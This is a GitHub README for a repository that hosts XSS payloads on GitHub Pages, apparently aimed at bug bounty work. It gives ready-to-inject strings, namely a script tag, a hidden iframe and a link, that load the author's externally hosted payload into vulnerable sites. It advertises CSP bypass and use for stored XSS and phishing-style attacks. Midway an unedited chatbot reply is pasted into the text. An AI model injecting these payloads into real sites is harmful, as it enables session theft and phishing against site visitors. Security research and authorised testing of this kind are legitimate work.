# XSS Payload Host (GitHub Pages)

This repository hosts XSS payloads via GitHub Pages. It is useful for security researchers, bug bounty hunters, or penetration testers to demonstrate and execute Cross-Site Scripting (XSS) payloads on vulnerable websites.
<br>
<div align="center" style="margin: 30px 0;">
  <a href="https://www.whatsapp.com/channel/0029Vb68FeRFnSzGNOZC3h3x">
    <img src="https://img.shields.io/static/v1?style=for-the-badge&message=WhatsApp+Channel&color=25D366&logo=whatsapp&logoColor=FFFFFF&label=" alt="WhatsApp Channel">
  </a>
  <a href="https://t.me/HackerSecure">
    <img src="https://img.shields.io/static/v1?style=for-the-badge&message=Telegram+Channel&color=24A1DE&logo=telegram&logoColor=FFFFFF&label=" alt="Telegram Channel">
  </a>
  <a href="https://www.linkedin.com/in/cybersecurity-pentester/">
    <img src="https://img.shields.io/static/v1?style=for-the-badge&message=LinkedIn&color=0A66C2&logo=LinkedIn&logoColor=FFFFFF&label=" alt="LinkedIn">
  </a>
  <a href="https://linktr.ee/yogsec">
    <img src="https://img.shields.io/static/v1?style=for-the-badge&message=LinkTree&color=25D366&logo=linktree&logoColor=FFFFFF&label=" alt="LinkTree">
  </a>
  <a href="https://x.com/home">
    <img src="https://img.shields.io/static/v1?style=for-the-badge&message=X&color=000000&logo=x&logoColor=FFFFFF&label=" alt="X">
  </a>
  <a href="mailto:abhinavsingwal@gmail.com?subject=Hi%20YogSec%20,%20nice%20to%20meet%20you!">
    <img src="https://img.shields.io/static/v1?style=for-the-badge&message=Gmail&color=EA4335&logo=Gmail&logoColor=FFFFFF&label=" alt="Email">
  </a>
  <a href="https://yogsec.github.io/yogsec/">
    <img src="https://img.shields.io/static/v1?style=for-the-badge&message=Website&color=FFFFC5&logo=Firefox&logoColor=000000&label=" alt="Website">
  </a>
</div>
<br>
![Page](https://github.com/yogsec/xss-test/blob/main/Screenshot%20from%202025-04-09%2002-47-52.png?raw=true)
## Features

- Hosts external XSS scripts via GitHub Pages
- Bypasses CSP in some cases (depending on target site)
- Works with `<script src>`, `<iframe>`, and `<img>`-based injection
- Easy to use for PoC (Proof-of-Concept)

---

Absolutely! Here's a clean, well-formatted `README.md` section for **"How to Use"**, with proper markdown and code blocks to make it look professional and easy to read:

---


## How I Use It

Use this GitHub Pages setup to host my XSS payloads for testing real-world vulnerabilities during bug bounty hunting.

🔗 **Live Payload URL:**  
[https://yogsec.github.io/xss-test/](https://yogsec.github.io/xss-test/)

When I find a vulnerable parameter or input field that allows HTML/JS injection, I inject a `<script src>` or `<iframe>` pointing to my hosted payload. Here are a few ways I use it:

### 📜 Basic Script Injection

```bash
<script src="https://yogsec.github.io/xss-test/"></script>
```

### 🕵️‍♂️ Stealthy iframe Injection

```bash
<iframe src="https://yogsec.github.io/xss-test/" style="display:none"></iframe>
```

### 🔗 Clickable Link Payload

```bash
<a href="https://yogsec.github.io/xss-test/">Click Here</a>
```

This method is useful on targets where CSP policies restrict inline scripts, but allow loading scripts or frames from external sources. It’s also handy for stored XSS and phishing-style payloads.

> ⚠️ Use only for ethical hacking and responsible disclosure.


